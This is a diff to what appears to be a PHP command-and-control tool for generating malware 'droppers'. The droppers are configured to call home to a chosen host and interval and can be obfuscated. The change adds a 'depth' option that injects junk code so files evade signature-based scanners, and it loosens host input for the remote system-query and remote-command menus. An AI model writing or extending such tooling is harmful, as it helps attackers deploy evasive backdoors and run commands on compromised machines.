@@ -203,13 +203,13 @@ function clo($host, $repo, $uri)
 
 }
 
-function createDropper($callHome, $duration, $extras, $obfsucate){
+function createDropper($callHome, $duration, $extras, $obfsucate, $depth){
     require "includes/droppers/dynamic_generator.php";
     $file_in = 'includes/droppers/base.php';
     $ob = 'includes/dynamic/droppers/obfuscated/'.bin2hex(random_bytes(rand(5,25))).'.php';
     $n = 'includes/dynamic/droppers/raw/'.bin2hex(random_bytes(rand(5,25))).'.php';
     $t = new dynamic_generator();
-    if (!empty($callHome) && !empty($duration) && !empty($extras)){
+    if (!empty($callHome) && !empty($duration) && !empty($extras) && !empty($depth)){
         try{
             switch(is_file("includes/droppers/base.php")){
                 case true:
@@ -226,11 +226,11 @@ function createDropper($callHome, $duration, $extras, $obfsucate){
             switch (strtolower($obfsucate)){
                 case "o"||"y"||"yes":
                     print("Generated dropper will be: {$ob}\n");
-                    $t->begin_junk($file_in, "1", $ob, "ob");
+                    $t->begin_junk($file_in, $depth, $ob, "ob");
                     break;
                 default:
                     print("Generated Dropper will be: {$n}\n");
-                    $t->begin_junk($file_in, "1", $n, "n");
+                    $t->begin_junk($file_in, "0", $n, "n");
             }
 
         }catch (Exception $exception){
@@ -371,11 +371,12 @@ while ($run) {
             $h = readline("Where are we calling home to?\n->");
             $d = readline("How often should we call home?\n->");
             $ob = readline("Do we need to obfuscate?\n->");
-            createDropper($h, $d, "1", $ob);
+            $de = readline("Level of depth?\nThis will add more randomness to the file making it less likely to be caught by signature based scanners.(int)\n->");
+            createDropper($h, $d, "1", $ob, $de);
             break;
         case "s":
             system($clears);
-            $h = readline("Which host are we checking?\n(right now I only accept IP Addresses.)\n->");
+            $h = readline("Which host are we checking?\n->");
             try {
                 sys($h, queryDB($h, "s"));
             }catch (Exception $e){
@@ -401,7 +402,7 @@ while ($run) {
         case "c":
             system($clears);
             try{
-                $h = readline("Which host are we sending the command to?\n(right now I only accept IP Addresses.)\n->");
+                $h = readline("Which host are we sending the command to?\n->");
                 $c = readline("And now the command: \n->");
                 co($c, $h, queryDB($h, 'c'));
             }catch (Exception $e){
